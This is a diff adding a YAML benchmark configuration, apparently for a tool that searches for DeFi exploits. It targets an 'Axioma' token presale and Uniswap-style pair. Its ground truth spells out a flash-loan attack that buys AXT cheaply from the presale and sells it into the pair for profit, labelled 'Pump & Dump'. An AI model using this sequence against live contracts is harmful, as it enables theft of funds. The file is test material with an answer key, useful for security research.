@@ -1,0 +1,67 @@
+# Information for benchmarks building.
+project_name: "Axioma"
+
+ctrt_name2cls:
+  - ["wbnb", "WBNB"]
+  - ["axt", "Axioma"]
+  - ["pair", "UniswapV2Pair"]
+  - ["axiomaPresale", "AxiomaPresale"]
+  - ["factory", "UniswapV2Factory"]
+  - ["router", "UniswapV2Router"]
+
+ctrt_name2deploy:
+  - ["wbnb", ""]
+  - ["axt", "new Axioma ()"]
+  - ["axiomaPresale", "new AxiomaPresale(address(axt), address(this), 300 * 10**9, 1)"]
+  - ["pair", ""]
+  - ["factory", ""]
+  - ["router", ""]
+  
+extra_actions: 
+- 'function swap_axiomaPresale_attacker_wbnb_axt(uint256 amount, uint256 amountOut) internal eurus {
+    wbnb.approve(address(axiomaPresale), amount);
+    axiomaPresale.buyToken(amount, address(wbnb));
+  }'
+
+extra_deployments:
+  - "axt.enableTrading(); axt.afterDeploy(address(router), address(pair));"
+
+extra_statements: []
+
+attack_goal_str: "wbnb"
+
+groundtruth:
+  - ["borrow", "wbnb", "owner", "32500 * 1e15"]
+  - ["swap", "axiomaPresale", "attacker", "wbnb", "axt", "32500 * 1e15", "1"]
+  - ["swap", "pair", "attacker", "axt", "wbnb", "axt.balanceOf(attacker)", "33500 * 1e15"]
+  - ["payback", "wbnb", "owner", "32500 * 1e15"]
+
+# Information for search space building.
+roles:
+  "wbnb":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: true
+  "axt":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: true
+  "pair":
+    is_swappair: true
+    is_uniswap: true
+    token_pair: ["axt", "wbnb"]
+    support_swaps:
+      "wbnb": ["axt", "wbnb"]
+      "axt": ["axt", "wbnb"]
+    is_oracle: true
+    oracle: "pair"
+    is_lendpool: true
+  "axiomaPresale":
+    is_swappair: true
+    token_pair: ["axt", "wbnb"]
+    support_swaps:
+      "wbnb": ["axt", "wbnb"]
+      "axt": ["axt", "wbnb"]
+    is_lendpool: true
+
+pattern: "Pump & Dump"
